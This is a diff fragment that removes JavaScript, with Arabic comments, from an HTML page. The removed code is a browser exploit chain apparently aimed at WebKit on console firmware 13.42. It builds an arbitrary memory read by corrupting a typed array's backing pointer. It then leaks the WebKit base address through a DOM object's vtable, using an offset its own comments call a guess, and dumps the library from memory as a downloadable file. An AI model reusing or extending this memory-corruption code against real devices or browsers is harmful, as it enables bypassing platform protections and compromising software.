-            // نوجه targetView ليقرأ من m_vector الخاص به (targetAddress + 0x10)
-            let mVecLow = (targetAddress + 0x10) & 0xFFFFFFFF;
-            let mVecHigh = Math.floor((targetAddress + 0x10) / 0x100000000);
-            
-            targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
-            targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
-            targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
-            
-            // نكتب العنوان المطلوب
-            targetView[0] = addrLow & 0xff; targetView[1] = (addrLow >> 8) & 0xff;
-            targetView[2] = (addrLow >> 16) & 0xff; targetView[3] = (addrLow >> 24) & 0xff;
-            targetView[4] = addrHigh & 0xff; targetView[5] = (addrHigh >> 8) & 0xff;
-            
-            // نقرأ النتيجة
-            let resLow = targetView[0] | (targetView[1] << 8) | (targetView[2] << 16) | (targetView[3] << 24);
-            let resHigh = targetView[4] | (targetView[5] << 8) | (targetView[6] << 16) | (targetView[7] << 24);
-            
-            // استعادة m_vector الأصلي لـ targetView (الذي يشير إلى targetBuffer)
-            // targetBuffer عنوانه مخزن في targetVector (من الـ PoC الأصلي)
-            let origTgtVecLow = targetVector & 0xFFFFFFFF;
-            let origTgtVecHigh = Math.floor(targetVector / 0x100000000);
-            
-            targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
-            targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
-            targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
-            
-            targetView[0] = origTgtVecLow & 0xff; targetView[1] = (origTgtVecLow >> 8) & 0xff;
-            targetView[2] = (origTgtVecLow >> 16) & 0xff; targetView[3] = (origTgtVecLow >> 24) & 0xff;
-            targetView[4] = origTgtVecHigh & 0xff; targetView[5] = (origTgtVecHigh >> 8) & 0xff;
-            
-            return (resLow >>> 0) + (resHigh >>> 0) * 0x100000000;
-        };
-        
-        plog("[✅] تم تفعيل safeRead64 بنجاح!");
-        plog("[+] اختبار القراءة من targetAddress: 0x" + safeRead64(targetAddress).toString(16));
-        
-        btnASLR.disabled = false;
-        plog("[ℹ️] يمكنك الآن الضغط على الزر الثاني (تسريب ASLR).");
-        
-    } catch (e) {
-        plog("[❌] خطأ في الإعداد: " + e.message);
-        btnARW.disabled = false;
-    }
-}
-
-function leakASLR() {
-    plog("[*] جاري تسريب WebKit Base Address...");
-    btnASLR.disabled = true;
-    
-    try {
-        // 1. إنشاء عنصر DOM
-        let ta = document.createElement("textarea");
-        let taAddr = 0;
-        
-        // نحتاج addrof. سنستخدم خدعة بسيطة:
-        // نضع ta في مصفوفة، ونقرأ المصفوفة
-        let arr = [ta];
-        // arr هو كائن JS. عنوانه؟ 
-        // هذا يتطلب addrof. 
-        
-        // الحل: نستخدم targetView لقراءة عنوان ta من الـ Heap إذا كنا نعرف أين هو.
-        // لكننا لا نعرف. 
-        
-        // لذلك، سنعتمد على أن الـ PoC الأصلي سرب hostAddress.
-        // fakeHost (hostAddress) يحتوي على خصائص.
-        // يمكننا إضافة ta كخاصية لـ fakeHost!
-        // fakeHost.ta = ta;
-        // ثم نقرأ hostAddress + offset الخاص بـ ta.
-        
-        fakeHost.ta = ta;
-        
-        // fakeHost هو JSFinalObject. الخصائص الديناميكية تذهب إلى الـ butterfly.
-        // عنوان الـ butterfly مخزن في hostAddress + 0x08.
-        let butterflyAddr = safeRead64(hostAddress + 0x08);
-        plog("[+] Butterfly Address: 0x" + butterflyAddr.toString(16));
-        
-        // أول خاصية ديناميكية (ta) ستكون في butterfly - 0x08 (لأن الـ butterfly ينمو للخلف في WebKit)
-        // أو butterfly + 0x00 حسب الإصدار. لنجرب butterfly - 0x08 أولاً (الشائع في WebKit).
-        let taJSValue = safeRead64(butterflyAddr - 0x08);
-        
-        // JSValue للكائن في WebKit 64-bit هو عنوانه (مع إزالة الـ tag إذا لزم الأمر)
-        // عادة يكون العنوان في الـ 48-bit السفلية.
-        taAddr = taJSValue & 0xFFFFFFFFFFFF; 
-        plog("[+] TextArea Address: 0x" + taAddr.toString(16));
-        
-        // 2. قراءة vtable pointer (عادة عند 0x18 أو 0x20)
-        let vtablePtr = safeRead64(taAddr + 0x18);
-        plog("[+] vtable Ptr: 0x" + vtablePtr.toString(16));
-        
-        let vtableAddr = safeRead64(vtablePtr);
-        plog("[+] vtable Addr: 0x" + vtableAddr.toString(16));
-        
-        // 3. قراءة أول دالة في الـ vtable
-        let firstFunc = safeRead64(vtableAddr);
-        plog("[+] First Func: 0x" + firstFunc.toString(16));
-        
-        // 4. حساب الـ Base (نحتاج الـ Offset الدقيق لـ FW 13.42)
-        // سنضع قيمة تقريبية الآن، ويجب تحديثها بعد الـ Dump
-        // في FW 4.03 كان حوالي 0x1358E0. في FW 13.42 قد يكون مختلفاً.
-        // سنطرح 0x150000 كتخمين أولي لرؤية الـ Base.
-        let DUMMY_OFFSET = 0xe50e98; 
-        
-        webKitBaseAddr = firstFunc - DUMMY_OFFSET;
-        plog("========================================");
-        plog("🔥 WEBKIT BASE (تقريبي): 0x" + webKitBaseAddr.toString(16));
-        plog("========================================");
-        plog("[ℹ️] بعد تفريغ المكتبة، ستحتاج لتحديث DUMMY_OFFSET بالقيمة الدقيقة.");
-        
-        btnDump.disabled = false;
-        plog("[ℹ️] يمكنك الآن الضغط على الزر الثالث (تفريغ المكتبة).");
-        
-    } catch (e) {
-        plog("[❌] خطأ في التسريب: " + e.message);
-        btnASLR.disabled = false;
-    }
-}
-
-async function dumpLibrary() {
-    plog("[*] جاري تفريغ المكتبة من: 0x" + webKitBaseAddr.toString(16));
-    btnDump.disabled = true;
-    
-    try {
-        // قراءة ELF Magic للتأكد من صحة العنوان
-        let magic = safeRead64(webKitBaseAddr) & 0xFFFFFF;
-        if (magic !== 0x464C457F) { // 0x7F 'E' 'L' 'F'
-            plog("[❌] ELF Magic غير صحيح! العنوان التقريبي خاطئ.");
-            plog("[ℹ️] يرجى تحديث DUMMY_OFFSET في الكود والمحاولة مرة أخرى.");
-            btnDump.disabled = false;
-            return;
-        }
-        plog("[+] ELF Header صالح. بدء التفريغ...");
-        
-        // قراءة e_phoff (0x20) و e_phnum (0x38)
-        let e_phoff = safeRead64(webKitBaseAddr + 0x20);
-        let e_phnum = safeRead64(webKitBaseAddr + 0x38) & 0xFFFF;
-        
-        plog("[+] Program Headers: " + e_phnum);
-        
-        // حساب الحجم الكلي
-        let maxOffset = 0;
-        for (let i = 0; i < e_phnum; i++) {
-            let phAddr = webKitBaseAddr + e_phoff + (i * 0x38);
-            let p_offset = safeRead64(phAddr + 0x08);
-            let p_filesz = safeRead64(phAddr + 0x20);
-            let end = p_offset + p_filesz;
-            if (end > maxOffset) maxOffset = end;
-        }
-        
-        let totalSize = maxOffset + 0x1000;
-        plog("[*] الحجم الكلي: " + (totalSize / 1024 / 1024).toFixed(2) + " MB");
-        
-        // التفريغ الفعلي (Chunking لمنع التجميد)
-        let chunkSize = 0x10000; // 64KB
-        let dumpData = new Uint8Array(totalSize);
-        
-        // سنستخدم targetView للقراءة المباشرة السريعة
-        // نوجه targetView ليقرأ من webKitBaseAddr
-        let addrLow = webKitBaseAddr & 0xFFFFFFFF;
-        let addrHigh = Math.floor(webKitBaseAddr / 0x100000000);
-        
-        let mVecLow = (targetAddress + 0x10) & 0xFFFFFFFF;
-        let mVecHigh = Math.floor((targetAddress + 0x10) / 0x100000000);
-        
-        targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
-        targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
-        targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
-        
-        targetView[0] = addrLow & 0xff; targetView[1] = (addrLow >> 8) & 0xff;
-        targetView[2] = (addrLow >> 16) & 0xff; targetView[3] = (addrLow >> 24) & 0xff;
-        targetView[4] = addrHigh & 0xff; targetView[5] = (addrHigh >> 8) & 0xff;
-        
-        plog("[*] جاري القراءة... (قد يستغرق دقيقة)");
-        
-        for (let offset = 0; offset < totalSize; offset += chunkSize) {
-            if (offset % 0x100000 === 0) {
-                plog("  > " + (offset / 1024 / 1024).toFixed(1) + " MB / " + (totalSize / 1024 / 1024).toFixed(1) + " MB");
-                await new Promise(r => setTimeout(r, 10)); // Yield
-            }
-            
-            let bytesToRead = Math.min(chunkSize, totalSize - offset);
-            for (let j = 0; j < bytesToRead; j++) {
-                dumpData[offset + j] = targetView[j];
-            }
-        }
-        
-        // استعادة targetView
-        let origTgtVecLow = targetVector & 0xFFFFFFFF;
-        let origTgtVecHigh = Math.floor(targetVector / 0x100000000);
-        
-        targetView[0x10] = mVecLow & 0xff; targetView[0x11] = (mVecLow >> 8) & 0xff;
-        targetView[0x12] = (mVecLow >> 16) & 0xff; targetView[0x13] = (mVecLow >> 24) & 0xff;
-        targetView[0x14] = mVecHigh & 0xff; targetView[0x15] = (mVecHigh >> 8) & 0xff;
-        
-        targetView[0] = origTgtVecLow & 0xff; targetView[1] = (origTgtVecLow >> 8) & 0xff;
-        targetView[2] = (origTgtVecLow >> 16) & 0xff; targetView[3] = (origTgtVecLow >> 24) & 0xff;
-        targetView[4] = origTgtVecHigh & 0xff; targetView[5] = (origTgtVecHigh >> 8) & 0xff;
-        
-        plog("[✅] تم التفريغ بنجاح! جاري تحميل الملف...");
-        
-        // تحميل الملف
-        let blob = new Blob([dumpData], { type: "application/octet-stream" });
-        let url = URL.createObjectURL(blob);
-        let a = document.createElement("a");
-        a.href = url;
-        a.download = "libSceWebKit2_FW1342.sprx";
-        document.body.appendChild(a);
-        a.click();
-        setTimeout(() => {
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }, 100);
-        
-        plog("🔥 تم تحميل الملف بنجاح!");
-        
-    } catch (e) {
-        plog("[❌] خطأ في التفريغ: " + e.message);
-        btnDump.disabled = false;
-    }
-}
-
-
 </script>
 </body>
 </html>
